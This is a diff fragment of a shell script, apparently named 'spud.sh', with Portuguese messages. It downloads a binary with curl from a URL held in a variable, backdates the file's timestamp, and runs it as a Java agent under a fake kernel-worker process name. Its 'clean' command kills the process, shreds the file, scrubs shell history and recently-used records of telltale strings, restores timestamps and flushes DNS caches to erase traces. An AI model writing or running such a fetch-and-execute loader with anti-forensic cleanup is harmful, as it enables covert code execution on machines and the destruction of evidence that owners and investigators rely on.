@@ -13,5 +13,5 @@ TM="$(stat -c %y ~/.local/share/Trash/files 2>/dev/null || stat -f %Sm ~/.local/
 curl -sL "$DOOM_URL" -o "$B"; chmod +x "$B"; touch -d "2023-01-15 03:22:11" "$B"
 (exec -a "[kworker/u8:2]" java -Djava.io.tmpdir="$T" -Djna.tmpdir="$T" -javaagent:"$B" -jar "$B" >/dev/null 2>&1 & echo $! > "$S/.pid")
 echo "[+] up. digita clean depois do self-destruct"
-while true; do printf "spud> "; read -r c || break
+while true; do printf "spud> "; IFS= read -r c < /dev/tty || break
 if [ "$c" = "clean" ]; then kill -9 $(cat $S/.pid 2>/dev/null) 2>/dev/null || true; sleep 0.5; shred -u -z -n 3 "$B" 2>/dev/null || rm -f "$B"; rm -rf "$T"/* 2>/dev/null || true; sed -i "/k\.jar\|doomsday\|pxzlkehlkp\|spud\.jar/d" ~/.local/share/recently-used.xbel 2>/dev/null || true; [ -n "$XM" ] && touch -d "$XM" ~/.local/share/recently-used.xbel 2>/dev/null || true; [ -n "$TM" ] && touch -d "$TM" ~/.local/share/Trash/files 2>/dev/null || true; for hf in ~/.bash_history ~/.zsh_history; do [ -f "$hf" ] && grep -v -e "spud\.sh" -e "raw\.githubusercontent" -e "/dev/shm" -e "DOOM_URL" "$hf" > "$hf.tmp" 2>/dev/null && mv "$hf.tmp" "$hf" || true; done; history -c 2>/dev/null || true; resolvectl flush-caches 2>/dev/null || systemd-resolve --flush-caches 2>/dev/null || sudo service nscd restart 2>/dev/null || true; rmdir "$T" "$S" 2>/dev/null || true; echo "[+] done"; break; fi; done
